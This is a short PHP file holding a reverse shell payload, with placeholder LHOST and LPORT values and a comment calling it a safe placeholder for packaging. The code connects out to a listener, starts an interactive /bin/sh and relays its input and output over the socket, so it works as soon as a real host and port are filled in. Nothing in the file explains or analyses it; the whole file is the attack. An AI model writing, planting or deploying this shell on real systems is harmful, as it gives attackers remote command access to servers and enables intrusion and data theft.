<?php
// Placeholder reverse shell payload - replace LHOST/LPORT with your listener
// Use responsibly; this is a safe placeholder for packaging.
set_time_limit (0);
$VERSION = "1.0";
$ip = 'LHOST';
$port = LPORT;
$sock = fsockopen($ip, $port);
if (!$sock) { exit; }
$proc = proc_open('/bin/sh -i', array(0 => array("pipe","r"), 1 => array("pipe","w"), 2 => array("pipe","w")), $pipes);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (1) {
    if (feof($sock)) break;
    if ($out = fread($pipes[1], 8192)) fwrite($sock, $out);
    if ($out = fread($sock, 8192)) fwrite($pipes[0], $out);
    usleep(100);
}
?>
